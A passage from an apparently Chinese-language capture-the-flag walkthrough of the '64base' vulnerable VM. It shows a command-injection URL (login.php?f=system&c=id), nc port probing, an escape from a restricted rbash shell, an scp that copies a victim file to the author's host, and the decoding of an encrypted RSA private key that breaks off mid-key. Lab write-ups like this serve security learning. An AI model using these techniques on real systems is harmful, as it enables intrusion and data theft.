class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dt</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">title</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">tabindex</span>=<span class="string">&quot;3&quot;</span> <span class="attr">accesskey</span>=<span class="string">&quot;l&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;cmdlogin&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span> /&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- basictoken=52714d544a54626d51315a45566157464655614446525557383966516f3d0a --&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">fieldset</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>有一行被註解的 <code>basictoken</code>，看起來又是文字轉十六進位的編碼，轉回正常的文字後再一次 <code>base64</code> 解碼發現失敗了，回頭再仔細看原始碼發現 <code>username</code> 跟 <code>password</code> 都多了一個 <code>id</code>，看起來一樣的原理，把三個字串串接起來以後再次解碼，即可得到 flag2：<code>flag2&#123;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo=&#125;</code>，flag 再解碼一次拿到一個 <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=vJwytFWA8uA%0A">Youtube</a>連結，看不出有什麼明顯的提示，唯一只有標題有提到 <code>burp</code>，感覺是在暗示 Burp Suite。</p>
+<p>仔細回頭看剛剛的登入頁面，注意到 <code>form</code> 表單會提交給 <code>login.php</code> 再 302 跳轉回來 <code>index.php</code>，用 <a target="_blank" rel="noopener" href="https://curl.haxx.se/">cURL</a> 檢查一下被跳轉的 <code>login.php</code> 便發現了 flag3：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -u &#x27;64base:Th353@r3N0TdaDr01DzU@reL00K1ing4&#x27; http://192.168.31.175/Imperial-Class/BountyHunter/login.php</span><br><span class="line"></span><br><span class="line">flag3&#123;NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo=&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解釋一下為什麼要用 <a target="_blank" rel="noopener" href="https://curl.haxx.se/">cURL</a>， <a target="_blank" rel="noopener" href="https://curl.haxx.se/">cURL</a> 預設是不會跟隨重新導向的，所以可以得到目標路徑的結果。如果要讓 <a target="_blank" rel="noopener" href="https://curl.haxx.se/">cURL</a> 跟隨重新導向的話，加上 <code>-L</code> 參數即可。</p>
+<p>再一次的，把 flag3 的內容解碼後得到了新的提示：<code>53cr3t5h377/Imperial-Class/BountyHunter/login.php?f=exec&amp;c=id</code></p>
+<p>該路徑畫面除了標題以外其他沒有任何東西，乍看之下感覺又是一個死胡同，但先前才花了很多時間找 flag2，這邊提示還是在文章最後：<br><img src="/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%889.09.41.png"></p>
+<p>提示說要用 <code>system</code> 而不要用 <code>exec</code>，那麼把剛剛的路徑修改一下：<code>http://192.168.31.175/Imperial-Class/BountyHunter/login.php?f=system&amp;c=id</code>，找到 flag4 。<br><img src="/%E8%9E%A2%E5%B9%95%E5%BF%AB%E7%85%A7%202018-02-10%20%E4%B8%8B%E5%8D%889.11.32.png"></p>
+<p>Flag4 解碼後得到新的帳號密碼：<code>64base:64base5h377</code>。</p>
+<h2 id="新的方向"><a href="#新的方向" class="headerlink" title="新的方向"></a>新的方向</h2><p>感覺 web 的部分現階段挖得差不多了，把目標轉移到一開始用 Nmap 掃描得到其他開啟的 port。首先先試 ssh。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ ssh 64base@192.168.31.175</span><br><span class="line">ssh: connect to host 192.168.31.175 port 22: Connection refused</span><br><span class="line"></span><br><span class="line">$ nc 192.168.31.175 22</span><br><span class="line">The programs included with the Fedora GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Fedora GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Mon Oct 24 02:04:10 4025 from 010.101.010.001</span><br><span class="line"></span><br><span class="line">#</span><br></pre></td></tr></table></figure>
+
+<p>似乎是一個假的 ssh service，先擱著。再來嘗試 4899 port。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">$ nc 192.168.31.175 4899</span><br><span class="line">sshhh! ssh! droids!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">So..</span><br><span class="line"></span><br><span class="line">You found a way in then...</span><br><span class="line"></span><br><span class="line">but, can you pop root?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                           /~\</span><br><span class="line">                                          |oo )    Did you hear that?</span><br><span class="line">                                          _\=/_</span><br><span class="line">                          ___            /  _  \</span><br><span class="line">                         / ()\          //|/.\|\\</span><br><span class="line">                       _|_____|_        \\ \_/  ||</span><br><span class="line">                      | | === | |        \|\ /| ||</span><br><span class="line">                      |_|  O  |_|        # _ _/ #</span><br><span class="line">                       ||  O  ||          | | |</span><br><span class="line">                       ||__*__||          | | |</span><br><span class="line">                      |~ \___/ ~|         []|[]</span><br><span class="line">                      /=\ /=\ /=\         | | |</span><br><span class="line">      ________________[_]_[_]_[_]________/_]_[_\_________________________</span><br></pre></td></tr></table></figure>
+
+<p>目前也還看不出什麼目的，繼續嘗試最後的 62964 port。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nc 192.168.31.175 62964</span><br><span class="line">SSH-2.0-OpenSSH_6.7p1 Debian-5+deb8u3</span><br></pre></td></tr></table></figure>
+
+<p>哦！看起來是一個真的 ssh service，立刻嘗試 ssh 指令，密碼就用 flag4 解碼得到的 <code>64base5h377</code>，可惜登入失敗了，flag1 的密碼也同樣登入失敗。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ssh 64base@192.168.31.175 -p62964</span><br><span class="line">64base@192.168.31.175&#x27;s password:</span><br><span class="line">Permission denied, please try again.</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因為期間機器有重新設定，所以接下來 Victim 的 IP 從 192.168.31.175 改成 192.168.31.184</p>
+</blockquote>
+<p>這裡大概卡了一個多禮拜，才想到這個 VM 的名稱就以 base64 來命名的，何不把 flag4 拿到的密碼再用 base64 邊一次呢？Bingo！密碼就是 <code>64base5h377</code> 的 base64 編碼<br><img src="/Screen%20Shot%202018-05-12%20at%209.58.10%20PM.png"></p>
+<p>進去以後檢查了一下當前目錄、一些常用的指令不可用，發現自己在一個被限制的 shell，檢查環境變數時候發現幾個點：</p>
+<ol>
+<li>SHELL 的確是 <code>/bin/rbash</code></li>
+<li>PATH 是 <code>/var/alt-bin</code><br><img src="/Screen%20Shot%202018-05-12%20at%2010.04.13%20PM.png"></li>
+</ol>
+<p><code>/var/alt-bin</code> 底下有這些檔案：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/var/alt-bin/awk</span><br><span class="line">/var/alt-bin/base64</span><br><span class="line">/var/alt-bin/cat</span><br><span class="line">/var/alt-bin/dircolors</span><br><span class="line">/var/alt-bin/droids</span><br><span class="line">/var/alt-bin/egrep</span><br><span class="line">/var/alt-bin/env</span><br><span class="line">/var/alt-bin/fgrep</span><br><span class="line">/var/alt-bin/file</span><br><span class="line">/var/alt-bin/find</span><br><span class="line">/var/alt-bin/grep</span><br><span class="line">/var/alt-bin/head</span><br><span class="line">/var/alt-bin/less</span><br><span class="line">/var/alt-bin/ls</span><br><span class="line">/var/alt-bin/more</span><br><span class="line">/var/alt-bin/perl</span><br><span class="line">/var/alt-bin/python</span><br><span class="line">/var/alt-bin/ruby</span><br><span class="line">/var/alt-bin/tail</span><br></pre></td></tr></table></figure>
+
+<p>有些常用的指令都並不是原本的結果，例如：<br><img src="/Screen%20Shot%202018-05-12%20at%2010.08.27%20PM.png"></p>
+<p>別擔心，因為 <code>/usr/bin</code> 還在而且正確的 find 執行檔也還在，所以我利用 find 指令來看看有沒有以 <code>flag</code> 命名的檔案：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/bin/find / -name &quot;*flag5*&quot; 2&gt;/dev/null</span><br><span class="line">/var/www/html/admin/S3cR37/flag5&#123;TG9vayBJbnNpZGUhIDpECg==&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不過當我在寫這篇文章要重現這個步驟時卻失效了，又花了一些時間研究才發現，<code>/var/alt-bin/droids</code> 這個檔案很重要，<code>$ droids</code> 執行以後會出現 code matrix 的動畫，按 q 鍵可以離開，PATH 環境變數會被更正！這時再執行 <code>/usr/bin/find</code> 便可以正常找到 flag。<br><img src="/Screen%20Shot%202018-05-12%20at%2010.15.23%20PM.png"><br><img src="/Screen%20Shot%202018-05-12%20at%2010.14.31%20PM.png"></p>
+<p>照慣例還是看看 flag 轉碼以後是什麼：<code>Look Inside! :D</code></p>
+<p><img src="/Screen%20Shot%202018-05-12%20at%2010.26.21%20PM.png"></p>
+<p>看起來是一張圖片，中間有個註解看起來很顯眼，格式像是十六進位，轉回文字看看：<br><img src="/Screen%20Shot%202018-05-12%20at%2010.30.33%20PM.png"></p>
+<p>看起來這是一個 RSA 的私鑰！在 VM 裡面 rbash 太綁手綁腳了，於是想把檔案拿出來在本機研究。既然可以 SSH 進入 VM，那麼 scp 指令應該可行！</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ scp /var/www/html/admin/S3cR37/flag5&#123;TG9vayBJbnNpZGUhIDpECg==&#125; theo@192.168.31.142:~/Desktop/flag5.jpg</span><br></pre></td></tr></table></figure>
+
+<p>得到的圖片：<br><img src="/flag5.jpg"></p>
+<p>剛剛看到的註解讓我有些在意，想看看會不會有完整的 RSA 私鑰：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ exiftool flag5.jpg</span><br><span class="line">ExifTool Version Number         : 10.80</span><br><span class="line">File Name                       : flag5.jpg</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 192 kB</span><br><span class="line">File Modification Date/Time     : 2018:05:12 22:33:25+08:00</span><br><span class="line">File Access Date/Time           : 2018:05:12 22:36:19+08:00</span><br><span class="line">File Inode Change Date/Time     : 2018:05:12 22:36:12+08:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : JPEG</span><br><span class="line">File Type Extension             : jpg</span><br><span class="line">MIME Type                       : image/jpeg</span><br><span class="line">JFIF Version                    : 1.01</span><br><span class="line">Resolution Unit                 : inches</span><br><span class="line">X Resolution                    : 72</span><br><span class="line">Y Resolution                    : 72</span><br><span class="line">Comment                         : 4c5330744c5331435255644a546942535530456755464a4a566b46555253424c52566b744c5330744c517051636d396a4c565235634755364944517352553544556c6c5156455645436b52460a5379314a626d5a764f69424252564d744d5449344c554e43517977324d6a46424d7a68425155513052546c475155457a4e6a55335130457a4f44673452446c434d7a553251776f4b625552300a556e684a643267304d464a54546b467a4d697473546c4a49646c4d356557684e4b325668654868564e586c795231424461334a6955566376556d64515543745352307043656a6c57636c52720a646c6c334e67705a59303931575756615457707a4e475a4a55473433526c7035536d64345230686f5533685262336857626a6c7252477433626e4e4e546b5270636e526a62304e50617a6c530a524546484e5756344f58673056453136436a684a624552435558453161546c5a656d6f35646c426d656d56435246706b53586f35524863795a323479553246465a335531656d56734b7a5a490a52303969526a686161444e4e53574e6f6554687a4d5668795254414b61335a4d53306b794e544a74656c64334e47746955334d354b31466856336c6f4d7a52724f45704a566e7031597a46520a51336c69656a56586231553157545532527a5a784d564a6b637a426959315a785446567a5a51704e5533704c617a4e745332465851586c4d574778764e3078756258467856555a4c5347356b0a516b557855326851566c5a704e47497752336c475355785054335a3062585a47596a5172656d68314e6d705056316c49436d73796147524453453554644374705a3264354f57686f4d3270680a52576456626c4e51576e56464e30354b6430525a5954646c553052685a3077784e31684c634774744d6c6c70516c5a7956566834566b31756232494b643168535a6a56435930644c56546b330a65475276636c59795648457261446c4c553278615a5463354f58527956484a475230356c4d4456326545527961576f315658517953324e52654373354f457334533342585441706e645570510a556c424c52326c71627a6b3253455248597a4e4d4e566c7a65453969566d63724c325a714d4546326330746d636d4e574c327834595663725357313562574d7854566870536b316962554e360a62455233436c52425632316863577453526b52355154464956585a30646c4e6c566e46544d533949616d6845647a6c6b4e45747a646e4e71613270326557565256484e7a5a6e4e6b52324e560a4d47684561316833556c647a6332514b4d6d517a5279744f616d3078556a56615445356e556d784f63465a48616d684c517a524263325a59557a4e4b4d486f7964444e4355453035576b39430a54554a6c4f5552344f4870744e58684757546c365633527964677042523342794d454a6f4f45745264323177616c4656597a46685a6e4e78595646594d465649546b7859564446615431644c0a616d63305530457a57454d355a454e4665555a784d464e4a65464671547a6c4d52304e48436a52524e57356a5a6c566f62585a3063586c3164454e7362444a6b5746427a57465a455a54526c0a6230517851327432536b354557544e4c554663725232744f4f5577724f554e516554677252453531626b5a4a6433674b4b3151724b7a64525a7939315546684c6354524e4e6a464a555467770a4d7a52566148565356314d30564846514f57463657444e44527a6c4d65573970516a5a57596b74505a555233546a68686157784d533170436377706d57546c524e6b464e4d584e3562476c360a53444675626e684c5433526155566431636e68715230704353584d324d6e526c6245317259584d356555354e617a4e4d64546478556b6732633364504f584e6b56454a70436974714d4867300a64555261616b706a5a30315965475a694d4863315154593062466c4763303153656b5a714e31686b5a6e6b784f53744e5a54684b525768524f45744f57455233555574456556564d526b39550a63336f4b4d544e575a6b4a4f65466c7a65557731656b6459546e703563566f3053533950547a644e5a575179616a4248656a426e4d6a4670534545764d445a74636e4d795932786b637a5a540a56554a4852585a754f4535705667707955334a494e6e5a46637a5254656d63776544686b5a45643255544278567a463254577455556e557a54336b765a544577526a63304e586845545546550a53314a7353316f32636c6c4954554e34536a4e4a59323530436b56364d45394e57466c6b517a5a4461555976535664305a3252564b32684c65585a7a4e484e4764454e4359327854595764740a5246524b4d6d74615a485530556c4a3357565a574e6d394a546e6f35596e4250646b554b556e677a534656785a6d354c553268796458704e4f56707261556c7264564e6d556e526d615531320a596c52365a6d5a4b56464d30597a513451303831574339535a5559765157464e654774695532524654305a7a53517047646a6c595a476b355532524f6458684853455579527a5249646b706b0a53584279526c5679566c4e7755306b344d48646e636d49794e44567a647a5a6e5647397064466f354d47684b4e47354b4e5746354e304648436c6c7059574531627a63344e7a63765a6e63320a57566f764d6c557a5155526b61564e50516d3072614770574d6b705765484a7665565659596b63315a475a734d32303452335a6d4e7a464b4e6a4a4753484534646d6f4b63557068626c4e720a4f4445334e586f77596d70795746646b5445637a52464e735355707063327851567974355247466d4e316c43566c6c33563149725645457861304d326157564a5154563056544e776269394a0a4d776f324e466f31625842444b3364785a6c52345232646c51334e6e53577335646c4e754d6e41765a5756305a456b7a5a6c46584f46645952564a69524756304d56564d5346427864456c700a4e314e61596d6f3464697451436d5a7553457852646b563353584d72516d59785133424c4d554672576d565654564a4655577443614552704e7a4a49526d4a334d6b6376656e46306153395a0a5a4735786545463562445a4d576e704a5a5646754f48514b4c3064714e477468636b6f78615530355357597a4f57524e4e55396851315a615569395554304a575956493462584a514e315a300a536d39794f57706c53444a305255777764473946635664434d56424c4d48565955416f744c5330744c55564f524342535530456755464a4a566b46555253424c52566b744c5330744c516f3d0a</span><br><span class="line">Image Width                     : 960</span><br><span class="line">Image Height                    : 720</span><br><span class="line">Encoding Process                : Baseline DCT, Huffman coding</span><br><span class="line">Bits Per Sample                 : 8</span><br><span class="line">Color Components                : 3</span><br><span class="line">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)</span><br><span class="line">Image Size                      : 960x720</span><br><span class="line">Megapixels                      : 0.691</span><br></pre></td></tr></table></figure>
+
+<p>果然有完整的私鑰！馬上把編碼轉換回來：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ echo &quot;4c5330744c5331435255644a546942535530456755464a4a566b46555253424c52566b744c5330744c517051636d396a4c565235634755364944517352553544556c6c5156455645436b52460a5379314a626d5a764f69424252564d744d5449344c554e43517977324d6a46424d7a68425155513052546c475155457a4e6a55335130457a4f44673452446c434d7a553251776f4b625552300a556e684a643267304d464a54546b467a4d697473546c4a49646c4d356557684e4b325668654868564e586c795231424461334a6955566376556d64515543745352307043656a6c57636c52720a646c6c334e67705a59303931575756615457707a4e475a4a55473433526c7035536d64345230686f5533685262336857626a6c7252477433626e4e4e546b5270636e526a62304e50617a6c530a524546484e5756344f58673056453136436a684a624552435558453161546c5a656d6f35646c426d656d56435246706b53586f35524863795a323479553246465a335531656d56734b7a5a490a52303969526a686161444e4e53574e6f6554687a4d5668795254414b61335a4d53306b794e544a74656c64334e47746955334d354b31466856336c6f4d7a52724f45704a566e7031597a46520a51336c69656a56586231553157545532527a5a784d564a6b637a426959315a785446567a5a51704e5533704c617a4e745332465851586c4d574778764e3078756258467856555a4c5347356b0a516b557855326851566c5a704e47497752336c475355785054335a3062585a47596a5172656d68314e6d705056316c49436d73796147524453453554644374705a3264354f57686f4d3270680a52576456626c4e51576e56464e30354b6430525a5954646c553052685a3077784e31684c634774744d6c6c70516c5a7956566834566b31756232494b643168535a6a56435930644c56546b330a65475276636c59795648457261446c4c553278615a5463354f58527956484a475230356c4d4456326545527961576f315658517953324e52654373354f457334533342585441706e645570510a556c424c52326c71627a6b3253455248597a4e4d4e566c7a65453969566d63724c325a714d4546326330746d636d4e574c327834595663725357313562574d7854566870536b316962554e360a62455233436c52425632316863577453526b52355154464956585a30646c4e6c566e46544d533949616d6845647a6c6b4e45747a646e4e71613270326557565256484e7a5a6e4e6b52324e560a4d47684561316833556c647a6332514b4d6d517a5279744f616d3078556a56615445356e556d784f63465a48616d684c517a524263325a59557a4e4b4d486f7964444e4355453035576b39430a54554a6c4f5552344f4870744e58684757546c365633527964677042523342794d454a6f4f45745264323177616c4656597a46685a6e4e78595646594d465649546b7859564446615431644c0a616d63305530457a57454d355a454e4665555a784d464e4a65464671547a6c4d52304e48436a52524e57356a5a6c566f62585a3063586c3164454e7362444a6b5746427a57465a455a54526c0a6230517851327432536b354557544e4c554663725232744f4f5577724f554e516554677252453531626b5a4a6433674b4b3151724b7a64525a7939315546684c6354524e4e6a464a555467770a4d7a52566148565356314d30564846514f57463657444e44527a6c4d65573970516a5a57596b74505a555233546a68686157784d533170436377706d57546c524e6b464e4d584e3562476c360a53444675626e684c5433526155566431636e68715230704353584d324d6e526c6245317259584d356555354e617a4e4d64546478556b6732633364504f584e6b56454a70436974714d4867300a64555261616b706a5a30315965475a694d4863315154593062466c4763303153656b5a714e31686b5a6e6b784f53744e5a54684b525768524f45744f57455233555574456556564d526b39550a63336f4b4d544e575a6b4a4f65466c7a65557731656b6459546e703563566f3053533950547a644e5a575179616a4248656a426e4d6a4670534545764d445a74636e4d795932786b637a5a540a56554a4852585a754f4535705667707955334a494e6e5a46637a5254656d63776544686b5a45643255544278567a463254577455556e557a54336b765a544577526a63304e586845545546550a53314a7353316f32636c6c4954554e34536a4e4a59323530436b56364d45394e57466c6b517a5a4461555976535664305a3252564b32684c65585a7a4e484e4764454e4359327854595764740a5246524b4d6d74615a485530556c4a3357565a574e6d394a546e6f35596e4250646b554b556e677a534656785a6d354c553268796458704e4f56707261556c7264564e6d556e526d615531320a596c52365a6d5a4b56464d30597a513451303831574339535a5559765157464e654774695532524654305a7a53517047646a6c595a476b355532524f6458684853455579527a5249646b706b0a53584279526c5679566c4e7755306b344d48646e636d49794e44567a647a5a6e5647397064466f354d47684b4e47354b4e5746354e304648436c6c7059574531627a63344e7a63765a6e63320a57566f764d6c557a5155526b61564e50516d3072614770574d6b705765484a7665565659596b63315a475a734d32303452335a6d4e7a464b4e6a4a4753484534646d6f4b63557068626c4e720a4f4445334e586f77596d70795746646b5445637a52464e735355707063327851567974355247466d4e316c43566c6c33563149725645457861304d326157564a5154563056544e776269394a0a4d776f324e466f31625842444b3364785a6c52345232646c51334e6e53577335646c4e754d6e41765a5756305a456b7a5a6c46584f46645952564a69524756304d56564d5346427864456c700a4e314e61596d6f3464697451436d5a7553457852646b563353584d72516d59785133424c4d554672576d565654564a4655577443614552704e7a4a49526d4a334d6b6376656e46306153395a0a5a4735786545463562445a4d576e704a5a5646754f48514b4c3064714e477468636b6f78615530355357597a4f57524e4e55396851315a615569395554304a575956493462584a514e315a300a536d39794f57706c53444a305255777764473946635664434d56424c4d48565955416f744c5330744c55564f524342535530456755464a4a566b46555253424c52566b744c5330744c516f3d0a&quot; | xxd -p -r | base64 -D</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,621A38AAD4E9FAA3657CA3888D9B356C</span><br><span class="line"></span><br><span class="line">mDtRxIwh40RSNAs2+lNRHvS9yhM+eaxxU5yrGPCkrbQW/RgPP+RGJBz9VrTkvYw6</span><br><span class="line">YcOuYeZMjs4fIPn7FZyJgxGHhSxQoxVn9kDkwnsMNDirtcoCOk9RDAG5ex9x4TMz</span><br><span class="line">8IlDBQq5i9Yzj9vPfzeBDZdIz9Dw2gn2SaEgu5zel+6HGObF8Zh3MIchy8s1XrE0</span><br><span class="line">kvLKI252mzWw4kbSs9+QaWyh34k8JIVzuc1QCybz5WoU5Y56G6q1Rds0bcVqLUse</span><br><span class="line">MSzKk3mKaWAyLXlo7LnmqqUFKHndBE1ShPVVi4b0GyFILOOvtmvFb4+zhu6jOWYH</span><br><span class="line">k2hdCHNSt+iggy9hh3jaEgUnSPZuE7NJwDYa7eSDagL17XKpkm2YiBVrUXxVMnob</span><br><span class="line">wXRf5BcGKU97xdorV2Tq+h9KSlZe799trTrFGNe05vxDrij5Ut2KcQx+98K8KpWL</span><br><span class="line">guJPRPKGijo96HDGc3L5YsxObVg+/fj0AvsKfrcV/lxaW+Imymc1MXiJMbmCzlDw</span><br><span class="line">TAWmaqkRFDyA1HUvtvSeVqS1/HjhDw9d4KsvsjkjvyeQTssfsdGcU0hDkXwRWssd</span><br><span class="line">2d3G+Njm1R5ZLNgRlNpVGjhKC4AsfXS3J0z2t3BPM9ZOBMBe9Dx8zm5xFY9zWtrv</span><br><span class="line">AGpr0Bh8KQwmpjQUc1afsqaQX0UHNLXT1ZOWKjg4SA3XC9dCEyFq0SIxQjO9LGCG</span><br><span class="line">4Q5ncfUhmvtqyutCll2dXPsXVDe4eoD1CkvJNDY3KPW+GkN9L+9CPy8+DNunFIwx</span><br><span class="line">+T++7Qg/uPXKq4M61IQ8034UhuRWS4TqP9azX3CG9LyoiB6VbKOeDwN8ailLKZBs</span><br><span class="line">fY9Q6AM1sylizH1nnxKOtZQWurxjGJBIs62telMkas9yNMk3Lu7qRH6swO9sdTBi</span><br><span class="line">+j0x4uDZjJcgMXxfb0w5A64lYFsMRzFj7Xdfy19+Me8JEhQ8KNXDwQKDyULFOTsz</span><br><span class="line">13VfBNxYsyL5zGXNzyqZ4I/OO7Med2j0Gz0g21iHA/06mrs2clds6SUBGEvn8NiV</span><br><span class="line">rSrH6vEs4Szg0x8ddGvQ0qW1vMkTRu3Oy/e10F745xDMATKRlKZ6rYHMCxJ3Icnt</span><br><span class="line">Ez0OMXYdC6CiF/IWtgdU+hKyvs4sFtCBclSagmDTJ2kZdu4RRwYVV6oINz9bpOvE</span><br><span class="line">Rx3HUqfnKShruzM9ZkiIkuSfRtfiMvbTzffJTS4c48CO5X/ReF/AaMxkbSdEOFsI</span><br><span class="line">Fv9Xdi9SdNuxGHE2G4HvJdIprFUrVSpSI80wgrb245sw6gToitZ90hJ4nJ5ay7AG</span><br><span 